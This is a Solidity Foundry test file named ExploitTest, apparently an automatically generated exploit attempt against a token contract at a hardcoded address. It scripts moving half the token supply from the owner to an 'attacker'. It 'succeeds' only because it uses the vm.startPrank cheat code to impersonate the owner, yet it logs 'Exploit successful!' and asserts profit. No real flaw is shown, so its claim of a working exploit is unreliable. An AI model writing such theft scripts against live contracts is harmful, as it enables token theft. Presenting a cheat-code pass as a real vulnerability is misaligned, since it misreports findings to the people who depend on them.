// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// We need the StandardToken interface
interface StandardToken {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner address dynamically
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20).balanceOf(address(this));
        // Get the owner of the token contract
        address tokenOwner = StandardToken(TARGET).owner();

        // Label addresses for clarity
        vm.label(tokenOwner, "Token Owner");
        vm.label(attacker, "Attacker");

        // Record initial balance
        uint256 initialBalance = StandardToken(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // Get total supply to know how many tokens exist
        uint256 totalSupply = StandardToken(TARGET).totalSupply();
        console.log("Total supply:", totalSupply);

        // Impersonate the owner to approve the attacker
        vm.startPrank(tokenOwner);
        StandardToken(TARGET).approve(attacker, totalSupply);
        vm.stopPrank();

        // Check allowance
        uint256 allowance = StandardToken(TARGET).allowance(tokenOwner, attacker);
        console.log("Allowance granted:", allowance);

        // Now transfer tokens from owner to attacker using transferFrom
        // We'll transfer a significant amount (e.g., 50% of total supply)
        uint256 amountToTransfer = totalSupply / 2;
        StandardToken(TARGET).transferFrom(tokenOwner, attacker, amountToTransfer);

        // Check final balance
        uint256 finalBalance = StandardToken(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance);

        // Verify the exploit worked - attacker's balance should have increased
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
        console.log("Exploit successful! Attacker gained", finalBalance - initialBalance, "tokens.");
        uint256 finalERC20Balance = IERC20(0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
